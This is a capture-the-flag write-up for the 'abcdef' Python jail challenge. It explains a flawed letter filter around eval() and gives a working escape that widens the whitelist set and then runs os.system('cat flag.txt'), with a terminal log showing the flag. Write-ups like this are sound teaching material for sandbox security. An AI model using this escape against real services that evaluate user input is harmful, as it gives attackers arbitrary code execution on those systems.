# abcdef

Category: Misc

Points: 50

Solves: 130

>The Grand Arcanist has severed the ley lines of syntax. A silence spell hangs heavy over the terminal, choking out all complex commands. The only magic that permeates the barrier is the Hex, the alphabet of the machine spirit. The interpreter will hear nothing but the six sacred runes: a, b, c, d, e, f. Can you conjure a flag from the silence?


## Solution

We are giving the following pyjail code. It seems like we are giving an input to evaluate but all the characters but be valid

```py
abcdef = set("abcdef")

def is_valid(text):
    for c in text:
        if ord(c) < 32 or ord(c) > 126:
            return False
        if c.isalpha() and c not in abcdef:
            return False
    return True

try:
    while True:
        x = input("> ")
        if is_valid(x):
            eval(x)
        else:
            print("[*] Failed.")
except Exception as e:
    print(e)
    pass
```

Now looking at the is_valid function, we can easily see that non ascii printable values are filtered by the `ord(c) < 32` and `ord(c) > 126` inequalities. However, the next check of `c.isalpha() and c not in abcdef` is faulty. This is because, we are checking that if c is alphabetical, then it must be either a, b, c, d, e, or f. However, if c is non-alphabetical then it will pass the check. This means that more than just the characters `abcdef` we are also allowed to used symbols like ```!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~``` and the numbers `0123456789`.

However, the fact that we are only limited to the alphabetical characters `abcdef` is still a problem. Luckily the set which contains our whitelisted characters is `abcdef` and is accessible globally. So how would we access more characters?

What we can do is to use the builtin method `__add__` that is a part of python `int` object. eg.

```py
>>> (1).__add__
<method-wrapper '__add__' of int object at 0x102dd2930>
```

Thus to get all these characters in a string we can use f-strings:

```py
>>> f"{(1).__add__}"
'<method-wrapper '__add__' of int object at 0x102dd2930>'
```

Now, we can add all these characters to the set `abcdef` with the following trick:

```py
>>> [abcdef:=abcdef|{*f"{(1).__add__}"}]
[{'p', '0', 'r', ' ', 'a', 'j', 'n', 'w', '9', 'x', 'f', 'c', 'o', '>', '_', '2', 'm', '<', 'i', "'", '3', 'b', '1', 't', 'e', 'h', 'd', '-'}]
```

We are setting `abcdef` to the union of `abcdef` and the characters in our f-strings. Now, while we gain a lot of characters, we are still missing some:

```py
>>> set(string.ascii_lowercase) - abcdef
{'q', 's', 'v', 'u', 'k', 'g', 'z', 'y', 'l'}
```

Luckily since we have `chr()` and the numbers. We can just add all of these characters to abcdef:

```py
>>> for x in {'q', 's', 'v', 'u', 'k', 'g', 'z', 'y', 'l'}:
...     print(f"abcdef.add(chr({ord(x)}))")
... 
abcdef.add(chr(113))
abcdef.add(chr(115))
abcdef.add(chr(118))
abcdef.add(chr(117))
abcdef.add(chr(107))
abcdef.add(chr(103))
abcdef.add(chr(122))
abcdef.add(chr(121))
abcdef.add(chr(108))
```

Finally, we can just run:

```py
__import__("os").system("cat flag.txt")
```

Thus in total we will run:


```py
[abcdef:=abcdef|{*f"{(1).__add__}"}]
abcdef.add(chr(113))
abcdef.add(chr(115))
abcdef.add(chr(118))
abcdef.add(chr(117))
abcdef.add(chr(107))
abcdef.add(chr(103))
abcdef.add(chr(122))
abcdef.add(chr(121))
abcdef.add(chr(108))
__import__("os").system("cat flag.txt")
```

Terminal output:

```py
% nc 34.118.61.99 10025
> [abcdef:=abcdef|{*f"{(1).__add__}"}]
abcdef.add(chr(113))
abcdef.add(chr(115))
abcdef.add(chr(118))
abcdef.add(chr(117))
abcdef.add(chr(107))
abcdef.add(chr(103))
abcdef.add(chr(122))
abcdef.add(chr(121))
abcdef.add(chr(108))
__import__("os").system("cat flag.txt")> > > > > > > > > > 
nullctf{g!bb3r!sh_d!dnt_st0p_y0u!}> 
```